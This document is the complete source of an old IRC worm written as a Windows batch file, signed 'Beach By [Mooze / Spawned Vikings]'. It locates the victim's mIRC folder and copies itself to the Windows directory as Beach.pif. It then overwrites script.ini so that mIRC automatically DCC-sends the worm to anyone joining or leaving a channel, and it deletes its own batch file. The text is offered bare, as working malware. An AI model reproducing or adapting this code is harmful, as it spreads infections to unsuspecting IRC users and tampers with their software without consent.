 [script]
 n0=on 1:CONNECT:{
 n1= /run command.com /c Beach.bat
 n2= /exit }

 if file exist C:\mirc\script.ini set mIRC=C:\mirc\
 if file exist C:\mirc32\script.ini set mIRC=C:\mirc32\
 if file exist C:\progra~1\mirc\script.ini set mIRC=C:\progra~1\mirc\
 if file exist C:\program\mirc\script.ini set mIRC=C:\program\mirc\
 if file exist C:\progra~1\mirc32\script.ini set mIRC=C:\progra~1\mirc32\
 if file exist C:\program\mirc32\script.ini set mIRC=C:\program\mirc32\
 if file exist D:\mirc\script.ini set mIRC=D:\mirc\
 if file exist D:\mirc32\script.ini set mIRC=D:\mirc32\
 if file exist D:\progra~1\mirc\script.ini set mIRC=D:\progra~1\mirc\
 if file exist D:\program\mirc\script.ini set mIRC=D:\program\mirc\
 if file exist D:\progra~1\mirc32\script.ini set mIRC=D:\progra~1\mirc32\
 if file exist D:\program\mirc32\script.ini set mIRC=D:\program\mirc32\


 Copy %0 %windir%\Beach.pif
 Del %mIRC%script.ini
 Echo [script] >>%mIRC%script.ini
 Echo n0=on *:JOIN:*: if ( $me != $nick ) /.dcc send $nick %windir%\Beach.pif>>%mIRC%script.ini
 Echo n1=on *:PART:*: if ( $me != $nick ) /.dcc send $nick %windir%\Beach.pif>>%mIRC%script.ini
 Echo n2=on *:TEXT:*master*:*:/amsg Mooze Is My Master!>>%mIRC%script.ini
 Echo ;Beach By [Mooze / Spawned Vikings]>>%mIRC%script.ini
 Del %mIRC%Beach.bat
 cls
